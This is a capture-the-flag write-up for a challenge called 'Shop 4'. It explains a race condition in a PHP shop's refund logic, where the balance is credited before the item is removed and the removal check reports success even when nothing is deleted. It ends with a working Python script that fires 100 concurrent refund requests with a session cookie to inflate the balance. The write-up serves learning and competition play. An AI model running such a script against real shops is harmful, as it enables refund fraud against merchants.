# Shop 4 writeup

## First Observations

On the website, after having created a user, we observe that we are able to buy and refund items from the shop.

Looking at the _index.php_ file in the associated code base, we see that there are two allowed _POST_ actions. These are _buy_ and _refund_.

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   [...]
    elseif ($action === 'buy') {
    [...]
    } elseif ($action === 'refund') {
     [...]
    }
}
```

Looking closer at these two actions we see that during a refund, the account is credied _before_ the item is actually removed from the associated account. This means that there is a small period of time where your account has been credited for a refund, but that you still have the item that you refunded.

Look at this simplified code to see how the refund process works.

```php
elseif ($action === 'refund') {
        if (isset($user_items[$item_id]) && $user_items[$item_id] > 0) {
            if (updateUserbalance($user['id'], $item['price'])) {
                if (removeUserItem($user['id'], $item_id)) {
                    // Successfully refunded item
                }
                else {
                    // Failed to remove item from basket, take back refunded money
                    updateUserbalance($user['id'], -$item['price'])
                }
            }
        }
    }
```

There are many problems with the code snippet above, but one of them is how the function _removeUserItem_ works. The boolean value returned by _removeUserItem_ is _not_ based on whether or not an item got removed, but rather on if the query successfully executed. This means that even if _no_ rows were affected/removed, the query still executed correctly and returns _true_. Hence, regardless of the query executed within the function, we can be rest assured that the refunded money will not be removed again because the _removeUserItem_ function failed.

```php
function removeUserItem($userId, $itemId) {
    $db = getDBConnection();
    $stmt = $db->prepare('DELETE FROM orders WHERE user_id = ? AND item_id = ? LIMIT 1');
    $stmt->bind_param('di', $userId, $itemId);
    return $stmt->execute();
}
```

## Exploit

In order to take advantage of the small time delta where we have gotten credited for a refund, without actually having the item removed, is to spam the server with a bunch of simulataneous requests. This will hopefully cause more than one request to update the credit balance, before the item is removed from our invetnory.

### Exploit Script

This script repeatedly tries to sell the same item multiple times. After each run you will need to manually buy a new item(s), and then run the script again. This will increase your balance until you can buy the flag.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "<url>"
headers = {
    "Host": "<host>",
    "Cookie": "session_token=<session-token>",
    "Content-Length": "20",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = "item_id=1&action=refund"

def send_post_request():
    response = requests.post(url, headers=headers, data=data)
    return response

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(send_post_request) for _ in range(100)]
    for future in futures:
        print(future.result().text)
```

###### Written by: alexanderkvamme

###### Team: dragonslayerz
